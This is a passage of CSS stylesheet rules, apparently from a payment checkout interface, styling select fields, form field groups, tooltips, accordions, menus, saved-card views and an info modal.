            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05), inset 0 0 0 1000px #fefbe7;
        }

        .Select--fakeAutofill .Select-source:focus,
        .Select-source:-webkit-autofill:focus {
            transition: box-shadow 0.08s ease-in, color 0.08s ease-in, filter 50000s;
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3), inset 0 0 0 1000px #fefbe7;
        }

        .Select-source:disabled {
            color: rgba(26, 26, 26, 0.4);
            transition: background-color 100000000s, box-shadow 0s linear;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05), inset 0 0 0 1000px rgba(26, 26, 26, 0.1);
        }

        .Select--fakeAutofill .Select-source:disabled,
        .Select-source:disabled:-webkit-autofill {
            -webkit-text-fill-color: rgba(26, 26, 26, 0.4);
        }

        .Select--invalid .Select-source {
            color: #dc2727;
        }

        .Select--invalid .Select-source:not(:focus) {
            box-shadow: 0 0 0 1px #ef9896, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
        }

        .Select--invalid .Select-source--empty {
            color: rgba(26, 26, 26, 0.5);
        }

        .Select--invalid.Select--fakeAutofill,
        .Select--invalid .Select-source:-webkit-autofill {
            -webkit-text-fill-color: rgba(26, 26, 26, 0.4);
            box-shadow: 0 0 0 1px rgba(220, 39, 39, 0.5), 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05), inset 0 0 0 1000px #fefbe7;
        }

        .Select-source::-ms-expand {
            display: none;
        }

        .Select-arrow {
            position: absolute;
            top: 50%;
            right: 12px;
            margin-top: -6px;
            pointer-events: none;
            width: 12px;
            height: 12px;
            z-index: 3;
        }

        .is-darkMode .Select-arrow {
            fill: hsla(0, 0%, 100%, 0.5);
        }

        .Select-source:disabled + .Select-arrow {
            display: none;
        }

        .Select-spinner {
            position: absolute;
            top: 50%;
            right: 12px;
            margin-top: -9px;
            pointer-events: none;
            width: 18px;
            height: 18px;
            z-index: 3;
        }

        .is-darkMode .Select-spinner {
            fill: hsla(0, 0%, 100%, 0.5);
        }

        .App-Container.is-squareBordered .FormFieldGroup-child .Select-source {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .Select .Select-source {
            border-top-left-radius: 18px;
        }

        @media only screen and (min-width: 992px) {
            .App-Container:not(.App-Container--setupMode) .Select-source {
                height: 36px;
                font-size: 14px;
            }
        }

        .FormFieldInput {
            position: relative;
        }

        .FormFieldInput-Icon {
            pointer-events: none;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            position: absolute;
            right: 0;
            top: 0;
            height: 100%;
            padding-right: 12px;
            z-index: 3;
        }

        .FormFieldInput.is-select .FormFieldInput-Icon {
            left: 0;
            right: auto;
            padding-left: 12px;
        }

        .FormFieldInput-Icons {
            height: 100%;
            position: absolute;
            right: 0;
            top: 0;
            padding-right: 8px;
        }

        .FormFieldInput-Icons,
        .FormFieldInput-IconsIcon {
            pointer-events: none;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            z-index: 3;
        }

        .FormFieldInput-IconsIcon {
            padding-right: 4px;
        }

        .FormFieldInput-Icon.is-disabled img,
        .FormFieldInput-Icon.is-disabled svg {
            -webkit-filter: grayscale(0.8);
            filter: grayscale(0.8);
            opacity: 0.4;
        }

        .FormFieldInput-Icon img,
        .FormFieldInput-Icon svg {
            -webkit-transform: scale(0.7);
            -ms-transform: scale(0.7);
            transform: scale(0.7);
            opacity: 0;
            transition: opacity 0.7s cubic-bezier(0.075, 0.82, 0.165, 1), -webkit-transform 0.4s cubic-bezier(0.075, 0.82, 0.165, 1);
            transition: transform 0.4s cubic-bezier(0.075, 0.82, 0.165, 1), opacity 0.7s cubic-bezier(0.075, 0.82, 0.165, 1);
            transition: transform 0.4s cubic-bezier(0.075, 0.82, 0.165, 1), opacity 0.7s cubic-bezier(0.075, 0.82, 0.165, 1), -webkit-transform 0.4s cubic-bezier(0.075, 0.82, 0.165, 1);
        }

        .FormFieldInput-Icon.is-loaded img,
        .FormFieldInput-Icon.is-loaded svg {
            -webkit-transform: scale(1);
            -ms-transform: scale(1);
            transform: scale(1);
            opacity: 1;
        }

        .FormFieldInput-Icon.is-select svg,
        .FormFieldInput.is-select img {
            transition: none;
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
            opacity: 1;
        }

        .FormFieldInput.is-select.has-icon select {
            text-indent: 26px;
        }

        .FormFieldInput--rounded,
        .FormFieldInput--rounded input {
            border-radius: 6px;
        }

        .FieldError {
            transition: all 0.3s ease;
            -webkit-transform-origin: top left;
            -ms-transform-origin: top left;
            transform-origin: top left;
            pointer-events: none;
        }

        .FieldError:not:empty {
            margin-top: 4px;
        }

        .FormFieldGroup-legend {
            position: absolute;
            height: 2px;
            width: 2px;
            opacity: 0;
        }

        .FormFieldGroup--is-empty .FormFieldInput-Icon {
            display: none;
        }

        .FormFieldGroup--is-empty .FormFieldGroup-childLeft .Input:not(:focus),
        .FormFieldGroup--is-empty .FormFieldGroup-childLeft .Select-source:not(:focus) {
            box-shadow: 0 0 0 1px #ef9896, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
        }

        .FormFieldGroup-Fieldset {
            margin: 4px 0 0;
            border: none;
            padding: 0;
        }

        .FormFieldGroup-labelContainer {
            position: relative;
        }

        .FormFieldGroup-container {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
        }

        .FormFieldGroup-container--supportTransitions {
            -webkit-perspective: 800px;
            perspective: 800px;
        }

        .FormFieldGroup-container--invalid {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            box-shadow: 0 0 0 1px #ef9896, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
            border-radius: 6px;
        }

        .FormFieldGroup-child {
            box-sizing: border-box;
            -webkit-box-flex: 0;
            -webkit-flex: 0 1 auto;
            -ms-flex: 0 1 auto;
            flex: 0 1 auto;
            min-width: 0;
            max-width: 100%;
            -webkit-transform-origin: "0%";
            -ms-transform-origin: "0%";
            transform-origin: "0%";
        }

        .FormFieldGroup-child--width-12 {
            width: 100%;
        }

        .FormFieldGroup-child--width-6 {
            width: 50%;
        }

        .FormFieldGroup-child .CheckoutInput,
        .FormFieldGroup-child .Select-source {
            border-radius: 0;
        }

        .FormFieldGroup-childTop.FormFieldGroup-childLeft .CheckoutInput,
        .FormFieldGroup-childTop.FormFieldGroup-childLeft .Select-source {
            border-top-left-radius: 6px;
        }

        .FormFieldGroup-childTop.FormFieldGroup-childRight .CheckoutInput,
        .FormFieldGroup-childTop.FormFieldGroup-childRight .Select-source {
            border-top-right-radius: 6px;
        }

        .FormFieldGroup-childBottom.FormFieldGroup-childLeft .CheckoutInput,
        .FormFieldGroup-childBottom.FormFieldGroup-childLeft .Select-source {
            border-bottom-left-radius: 6px;
        }

        .FormFieldGroup-childBottom.FormFieldGroup-childRight .CheckoutInput,
        .FormFieldGroup-childBottom.FormFieldGroup-childRight .Select-source {
            border-bottom-right-radius: 6px;
        }

        .App-Container.is-veryRoundBordered .FormFieldGroup .CheckoutInput,
        .App-Container.is-veryRoundBordered .FormFieldGroup .Select-source,
        .ModalContent--is-veryRoundBordered .FormFieldGroup .CheckoutInput,
        .ModalContent--is-veryRoundBordered .FormFieldGroup .Select-source {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .FormFieldGroup-childTop.FormFieldGroup-childLeft .CheckoutInput,
        .App-Container.is-veryRoundBordered .FormFieldGroup-childTop.FormFieldGroup-childLeft .Select-source,
        .ModalContent--is-veryRoundBordered .FormFieldGroup-childTop.FormFieldGroup-childLeft .CheckoutInput,
        .ModalContent--is-veryRoundBordered .FormFieldGroup-childTop.FormFieldGroup-childLeft .Select-source {
            border-top-left-radius: 18px;
        }

        .App-Container.is-veryRoundBordered .FormFieldGroup-childTop.FormFieldGroup-childRight .CheckoutInput,
        .App-Container.is-veryRoundBordered .FormFieldGroup-childTop.FormFieldGroup-childRight .Select-source,
        .ModalContent--is-veryRoundBordered .FormFieldGroup-childTop.FormFieldGroup-childRight .CheckoutInput,
        .ModalContent--is-veryRoundBordered .FormFieldGroup-childTop.FormFieldGroup-childRight .Select-source {
            border-top-right-radius: 18px;
        }

        .App-Container.is-veryRoundBordered .FormFieldGroup-childBottom.FormFieldGroup-childLeft .CheckoutInput,
        .App-Container.is-veryRoundBordered .FormFieldGroup-childBottom.FormFieldGroup-childLeft .Select-source,
        .ModalContent--is-veryRoundBordered .FormFieldGroup-childBottom.FormFieldGroup-childLeft .CheckoutInput,
        .ModalContent--is-veryRoundBordered .FormFieldGroup-childBottom.FormFieldGroup-childLeft .Select-source {
            border-bottom-left-radius: 18px;
        }

        .App-Container.is-veryRoundBordered .FormFieldGroup-childBottom.FormFieldGroup-childRight .CheckoutInput,
        .App-Container.is-veryRoundBordered .FormFieldGroup-childBottom.FormFieldGroup-childRight .Select-source,
        .ModalContent--is-veryRoundBordered .FormFieldGroup-childBottom.FormFieldGroup-childRight .CheckoutInput,
        .ModalContent--is-veryRoundBordered .FormFieldGroup-childBottom.FormFieldGroup-childRight .Select-source {
            border-bottom-right-radius: 18px;
        }

        .FormFieldGroup-singleChild {
            border-radius: 6px !important;
        }

        .App-Container.is-squareBordered .FormFieldGroup-singleChild {
            border-radius: 0 !important;
        }

        .App-Container.App-Container.is-veryRoundBordered .FormFieldGroup-singleChild {
            border-radius: 18px !important;
        }

        .FormFieldGroup-bottomChild {
            border-bottom-right-radius: 6px !important;
            border-bottom-left-radius: 6px !important;
        }

        .p-FlagIcon {
            width: 16px;
            height: 16px;
        }

        .PhoneNumberCountryCodeSelect-wrapper {
            cursor: pointer;
            height: 16px;
            pointer-events: none;
            position: relative;
            width: 16px;
        }

        .PhoneNumberCountryCodeSelect-wrapper:hover .PhoneNumberCountryCodeSelect-chevron {
            fill: rgba(26, 26, 26, 0.8);
        }

        .PhoneNumberCountryCodeSelect-wrapper select {
            -moz-appearance: none;
            -webkit-appearance: none;
            appearance: none;
            background-color: inherit;
            border-radius: 0;
            border: none;
            outline: 0;
        }

        .PhoneNumberCountryCodeSelect-wrapper select:focus {
            border-radius: 3px;
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
        }

        .PhoneNumberCountryCodeSelect-wrapper select::-ms-expand {
            display: none;
        }

        .PhoneNumberCountryCodeSelect-flagIcon {
            left: 0;
            position: absolute;
            top: 0;
            z-index: 3;
        }

        .PhoneNumberCountryCodeSelect-select {
            height: 0;
            left: 0;
            padding: 8px 12px 8px 8px;
            pointer-events: auto;
            position: absolute;
            top: 0;
            width: 0;
            z-index: 2;
        }

        @media only screen and (max-width: 991.98px) {
            .PhoneNumberCountryCodeSelect-select {
                padding-bottom: 44px;
                padding-left: 20px;
                padding-top: 0;
                left: -12px;
                top: -16px;
            }
        }

        .PhoneNumberCountryCodeSelect-chevron {
            bottom: -1px;
            cursor: pointer;
            height: 8px;
            position: absolute;
            right: -4px;
            width: 8px;
            z-index: 4;
        }

        .Tooltip {
            position: absolute;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            pointer-events: none;
        }

        .Tooltip .Tooltip-Text {
            position: relative;
            max-width: 200px;
            min-width: 150px;
            background-color: #fff;
            border-radius: 6px;
            padding: 14px;
            z-index: 1;
            box-shadow: 0 0 0 1px rgba(136, 152, 170, 0.1), 0 15px 35px 0 rgba(129, 129, 136, 0.1), 0 5px 15px 0 rgba(0, 0, 0, 0.08);
            line-height: 15px;
        }

        .is-darkMode .Tooltip .Tooltip-Text .Text {
            color: rgba(26, 26, 26, 0.8);
        }

        .Tooltip .Tooltip-Arrow {
            position: absolute;
            height: 21px;
            width: 17px;
        }

        .Tooltip .Tooltip-Text--above {
            top: -100%;
            left: -50%;
        }

        .Tooltip .Tooltip-Text--above .Tooltip-Arrow {
            -webkit-transform: rotate(180deg);
            -ms-transform: rotate(180deg);
            transform: rotate(180deg);
            top: 100%;
            right: 50%;
            margin-top: -7px;
            margin-right: -8px;
        }

        .Tooltip .Tooltip-Text--below {
            top: 0;
            left: -50%;
        }

        .Tooltip .Tooltip-Text--below .Tooltip-Arrow {
            -webkit-transform: rotate(0deg);
            -ms-transform: rotate(0deg);
            transform: rotate(0deg);
            top: 0;
            left: 50%;
            margin-top: -14px;
            margin-left: -9px;
        }

        .Tooltip .Tooltip-Text--left {
            top: -50%;
            left: -100%;
        }

        .Tooltip .Tooltip-Text--left .Tooltip-Arrow {
            -webkit-transform: rotate(90deg);
            -ms-transform: rotate(90deg);
            transform: rotate(90deg);
            top: 50%;
            right: 0;
            margin-top: -10.5px;
            margin-right: -12px;
        }

        .Tooltip .Tooltip-Text--right {
            top: -50%;
            left: 0;
        }

        .Tooltip .Tooltip-Text--right .Tooltip-Arrow {
            -webkit-transform: rotate(-90deg);
            -ms-transform: rotate(-90deg);
            transform: rotate(-90deg);
            top: 50%;
            left: 0;
            margin-top: -10.5px;
            margin-left: -12px;
        }

        .Tooltip-animate,
        .Tooltip-animate-exited {
            -webkit-transform: scale(0.85);
            -ms-transform: scale(0.85);
            transform: scale(0.85);
            opacity: 0;
            transition: opacity 0.25s cubic-bezier(0, 1, 0.4, 1), -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: opacity 0.25s cubic-bezier(0, 1, 0.4, 1), transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: opacity 0.25s cubic-bezier(0, 1, 0.4, 1), transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1), -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .Tooltip-animate-exiting {
            -webkit-transform: scale(0.95);
            -ms-transform: scale(0.95);
            transform: scale(0.95);
            transition: opacity 0.2s ease-in, -webkit-transform 0.2s ease-in;
            transition: opacity 0.2s ease-in, transform 0.2s ease-in;
            transition: opacity 0.2s ease-in, transform 0.2s ease-in, -webkit-transform 0.2s ease-in;
        }

        .Tooltip-animate-entered,
        .Tooltip-animate-entering {
            -webkit-transform: scale(1);
            -ms-transform: scale(1);
            transform: scale(1);
            opacity: 1;
        }

        @media only screen and (min-width: 768px) {
            .Tooltip .Tooltip-Text {
                width: 200px;
            }
        }

        .PhoneNumberInput-inputWrapper {
            position: relative;
        }

        .PhoneNumberInput-label {
            padding-bottom: 4px;
            display: block;
        }

        .PhoneNumberInput-dynamicIcons {
            pointer-events: none;
            position: absolute;
            z-index: 3;
            top: 50%;
            -webkit-transform: translateY(-50%);
            -ms-transform: translateY(-50%);
            transform: translateY(-50%);
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            right: 12px;
        }

        .PhoneNumberInput-tooltipIconWrapper {
            pointer-events: auto;
            margin-left: 8px;
        }

        .PhoneNumberInput-tooltipIcon {
            color: rgba(26, 26, 26, 0.5);
        }

        .Accordion {
            background-color: #fff;
            border-radius: 6px;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
            margin: 4px 0 0;
            -webkit-transform: translate(0);
            -ms-transform: translate(0);
            transform: translate(0);
        }

        .Accordion .Menu-items {
            position: fixed;
        }

        .Accordion .AccordionItem {
            border-top: 1px solid rgba(26, 26, 26, 0.1);
        }

        .Accordion .AccordionItem:first-child {
            border-top: none;
        }

        .App-Container.is-squareBordered .Accordion {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .Accordion {
            border-radius: 18px;
        }

        .AccordionError {
            border-radius: 6px;
            background-color: rgba(220, 39, 39, 0.04);
            padding: 4px 8px;
            margin: 4px 0;
            width: -webkit-fit-content;
            width: -moz-fit-content;
            width: fit-content;
        }

        .AccordionError-icon {
            -webkit-flex-basis: 12px;
            -ms-flex-preferred-size: 12px;
            flex-basis: 12px;
            margin-top: 4px;
        }

        .AccordionError-message {
            margin-left: 8px;
            -webkit-flex-basis: auto;
            -ms-flex-preferred-size: auto;
            flex-basis: auto;
            width: -webkit-fit-content;
            width: -moz-fit-content;
            width: fit-content;
        }

        .AccordionButton {
            cursor: pointer;
            border: 0;
            margin: 0;
            padding: 0;
            background: none;
        }

        .AccordionItemContent {
            width: 100%;
            padding: 16px;
        }

        .AccordionItemContent--hidden {
            position: absolute;
            top: 0;
            left: 0;
        }

        .AccordionItemContent-body {
            padding-top: 12px;
        }

        .AccordionItemCover {
            width: 100%;
            padding: 16px;
        }

        .AccordionItemCover--hidden {
            position: absolute;
            top: 0;
            left: 0;
        }

        .AccordionItemCover-label {
            width: 25%;
            line-height: 14px;
        }

        .AccordionItemCover-content {
            padding: 8px 0;
        }

        .AccordionItem {
            overflow: hidden;
            transition: height 0.2s;
        }

        .AccordionItem-wrapper {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            position: relative;
        }

        .LinkFooter .Icon svg {
            display: block;
        }

        .LinkBillingAccordionItem .AccordionItemCover-title {
            margin-top: -2px;
        }

        .LinkBillingAccordionItem .AccordionItemContent-body .LinkBillingAccordionItem-checkbox {
            margin-top: 16px;
        }

        .Picker {
            margin: 4px 0 0;
        }

        .MenuAction {
            cursor: pointer;
            background: none;
            border: none;
            text-align: left;
            padding: 6px 10px;
            color: #0074d4;
            transition: background-color 0.2s ease;
        }

        .MenuAction:first-child {
            padding-top: 10px;
        }

        .MenuAction:last-child {
            padding-bottom: 10px;
        }

        .MenuAction:hover {
            background-color: #f7f7f7;
        }

        .MenuAction--danger {
            color: #dc2727;
        }

        .Menu-trigger {
            cursor: pointer;
            padding: 0;
            border: 0;
            border-radius: 6px;
            height: 24px;
            width: 24px;
            margin-right: -4px;
            background: transparent;
            -webkit-transform: rotate(90deg);
            -ms-transform: rotate(90deg);
            transform: rotate(90deg);
            transition: background-color 0.2s ease;
        }

        .Menu-icon {
            display: block;
            margin: auto;
        }

        .Menu-trigger:hover {
            background-color: rgba(0, 0, 0, 0.05);
        }

        .Menu-actionItem,
        .Menu-dangerousActionItem {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
        }

        .Menu-divider {
            height: 1px;
            background: rgba(0, 0, 0, 0.05);
        }

        .Menu-items {
            z-index: 10;
            position: absolute;
            right: 4%;
            font-size: 14px;
            background-color: #fff;
            border: 0;
            border-radius: 10px;
            box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.04), 0 30px 45px -30px rgba(0, 0, 0, 0.06), 0 18px 36px -18px rgba(0, 0, 0, 0.06);
            overflow: hidden;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.2s ease;
        }

        .Menu--open .Menu-items {
            opacity: 1;
            pointer-events: all;
        }

        .App-Container.is-squareBordered .Menu-items,
        .App-Container.is-squareBordered .Menu-trigger {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .Menu-items,
        .App-Container.is-veryRoundBordered .Menu-trigger {
            border-radius: 18px;
        }

        .PickerItem {
            font-size: 14px;
            background-color: #fff;
            border: 0;
            border-radius: 6px;
            box-shadow: 0 0 0 1px #e0e0e0;
            padding: 12px;
            transition: box-shadow 0.08s ease-in;
            margin: 8px 0 0;
            width: 100%;
            cursor: pointer;
        }

        .PickerItem:hover {
            box-shadow: 0 0 0 1px hsla(0, 0%, 68.6%, 0.5), 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
        }

        .PickerItem:focus,
        .PickerItem:focus:hover {
            outline: none;
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
        }

        .PickerItem--highlight,
        .PickerItem--highlight:hover {
            box-shadow: 0 0 0 2px #0074d4;
        }

        .PickerItem--highlight:focus,
        .PickerItem--highlight:focus:hover {
            box-shadow: 0 0 0 2px #0074d4, 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
        }

        .PickerItem--disabled,
        .PickerItem--disabled:hover {
            cursor: default;
            color: rgba(0, 0, 0, 0.5);
            box-shadow: 0 0 0 1px #e0e0e0;
        }

        .PickerItem-container {
            min-height: 24px;
        }

        .App-Container.is-squareBordered .PickerItem {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .PickerItem {
            border-radius: 18px;
        }

        .SavedCardView {
            width: 100%;
        }

        .SavedCardView-error {
            margin-left: auto;
            margin-right: 2px;
        }

        .SavedCardView-error .Icon {
            display: block;
        }

        .SavedCardView-error .Text {
            line-height: 12px;
        }

        .LinkPaymentPicker-newItem svg {
            display: block;
            margin: auto;
        }

        .LinkPaymentPicker-newItem .Text {
            color: #0074d4;
        }

        .LinkPaymentPicker-newIcon {
            height: 24px;
            width: 24px;
            background: rgba(0, 85, 255, 0.03);
            border-radius: 6px;
            margin-right: 8px;
        }

        .LinkUpdateCardForm-number {
            background-color: #fff;
            border-radius: 6px;
            box-shadow: 0 0 0 1px #e0e0e0;
            padding: 12px;
        }

        .App-Container.is-squareBordered .LinkUpdateCardForm-number {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .LinkUpdateCardForm-number {
            border-radius: 18px;
        }

        .LinkUpdateCardForm .BillingAddressForm-addressInput {
            margin-bottom: 8px;
        }

        .LinkUpdateCardForm-updateButton {
            width: 100%;
            transition: all 0.2s ease;
        }

        .LinkUpdateCardForm-updateButton--incomplete .Text {
            opacity: 0.6;
        }

        .LinkUpdateCardForm-updateButton .Spinner {
            margin-top: -1px;
            margin-bottom: -1px;
        }

        .LabeledTableRow--wide > td:first-child {
            padding-right: 24px;
        }

        .LabeledTableRow .LabeledTableRow--valueWithLineBreaks {
            white-space: pre-wrap;
        }

        .LabeledTableRow td:last-child {
            word-break: break-word;
        }

        .LeftLabeledTable-table {
            border-collapse: separate;
            border-spacing: 24px 4px;
            margin: -4px -24px 0;
            width: calc(100% + 48px);
        }

        .LeftLabeledTable-well {
            border-collapse: separate;
            background-color: rgba(26, 26, 26, 0.05);
            border-spacing: 12px 4px;
            border-radius: 6px;
            border: 1px solid rgba(26, 26, 26, 0.1);
            padding: 4px 2px;
            width: 100%;
        }

        .BacsDebitRulesNotice p:last-child {
            margin-bottom: 0;
        }

        .PrefilledInfo {
            margin: 0;
            padding: 12px;
            border: 1px solid rgba(26, 26, 26, 0.1);
            border-radius: 6px;
            background-color: rgba(26, 26, 26, 0.1);
        }

        .PrefilledInfo .PrefilledInfoItem:not(:last-child) {
            margin-bottom: 8px;
        }

        .PrefilledInfoItem-value {
            margin: 0;
        }

        .BlikPending {
            padding: 32px;
            margin-top: 24px;
            background-color: rgba(0, 0, 0, 0.03);
            border-radius: 12px;
            overflow: hidden;
        }

        .billing-container {
            margin-top: 8px;
        }

        .CardFormFieldGroupIconOverflow {
            width: 28px;
            height: 16px;
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .CardFormFieldGroupIconOverflow-Item {
            transition: all 0.4s ease;
            transition-delay: 0.15s;
            position: absolute;
            top: 0;
            left: 0;
        }

        .CardFormFieldGroupIconOverflow-Item--visible {
            opacity: 1;
            -webkit-transform: scale(1);
            -ms-transform: scale(1);
            transform: scale(1);
        }

        .CardFormFieldGroupIconOverflow-Item--invisible {
            opacity: 0;
            -webkit-transform: scale(0.9);
            -ms-transform: scale(0.9);
            transform: scale(0.9);
        }

        .ReadOnlyCardField-field {
            padding: 8px 12px;
            line-height: 1.5;
            height: 44px;
            font-size: 16px;
        }

        .ReadOnlyCardField-number {
            border-bottom: 1px solid rgba(26, 26, 26, 0.1);
        }

        .ReadOnlyCardField-expiry {
            border-right: 1px solid rgba(26, 26, 26, 0.1);
        }

        .ReadOnlyCardField-cvc,
        .ReadOnlyCardField-number {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        @media only screen and (min-width: 992px) {
            .App-Container:not(.App-Container--setupMode) .ReadOnlyCardField-field {
                height: 36px;
                font-size: 14px;
            }
        }

        .InfoModal-modalOverlay {
            opacity: 0;
            background-color: rgba(0, 0, 0, 0.2);
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            transition: opacity 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .InfoModal-modalOverlay.ModalOverlay--afterOpen {
            opacity: 1;
        }

        .InfoModal-modalOverlay.ModalOverlay--beforeClose {
            opacity: 0;
            transition: opacity 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .InfoModal-modal {
            background-color: #fff;
            -webkit-backdrop-filter: blur(40px);
            backdrop-filter: blur(40px);
            border-radius: 8px;
            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.2), 0 6px 12px rgba(0, 0, 0, 0.03);
            width: 100%;
            max-width: 348px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            padding: 56px 24px 24px;
            font-size: 14px;
            letter-spacing: -0.15px;
            -webkit-transform: scale(0.95);
            -ms-transform: scale(0.95);
            transform: scale(0.95);
            transition: -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1), -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .InfoModal-modal.ModalContent--afterOpen {
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
        }

        .InfoModal-modal.ModalContent--beforeClose {
            -webkit-transform: scale(0.95);
            -ms-transform: scale(0.95);
            transform: scale(0.95);
            transition: -webkit-transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1), -webkit-transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .InfoModal-headerText {
            max-width: 270px;
            text-align: center;
            color: rgba(26, 26, 26, 0.7);
            line-height: 18px;
        }

        .InfoModal-bulletBlock {
            max-width: 270px;
            margin-top: 24px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
        }

        .InfoModal-bulletText {
            margin-left: 12px;
        }

        .InfoModal-bulletTitle {
            color: rgba(26, 26, 26, 0.9);
            line-height: 18px;
        }

        .InfoModal-bulletIcon path,
        .InfoModal-bulletIcon svg {
            fill: #000;
        }

        .InfoModal-bulletDescription {
            margin-top: 2px;
            color: rgba(26, 26, 26, 0.5);
            line-height: 17px;
        }

        .InfoModal-footerText {
            margin-top: 24px;
            color: rgba(26, 26, 26, 0.4);
            font-size: 13px;
            line-height: 16px;
        }

        .InfoModal-buttonGroup {
            margin-top: 24px;
            width: 100%;
        }

        .InfoModal-closeButton {
            padding: 12px;
            background-color: rgba(0, 0, 0, 0.03);
            width: 100%;
        }

        .InfoModal-linkButton {
            padding: 12px;
            background: none;
            width: 100%;
        }

        .InfoModal-privacyLink {
            border-radius: 6px;
            color: rgba(26, 26, 26, 0.5);
            width: 100%;
        }

        .InfoModal-closeButton:hover {
            background-color: rgba(26, 26, 26, 0.05);
        }

        .InfoModal-linkButton:hover {
            background-color: rgba(0, 0, 0, 0.03);
        }

        .InfoModal-closeButton:active {
            background-color: rgba(0, 0, 0, 0.075);
            -webkit-transform: scale(0.98);
            -ms-transform: scale(0.98);
            transform: scale(0.98);
        }

        .SignUpForm-container {
            position: relative;
            width: 100%;
            overflow: hidden;
            padding: 8px 12px;
            border: 0;
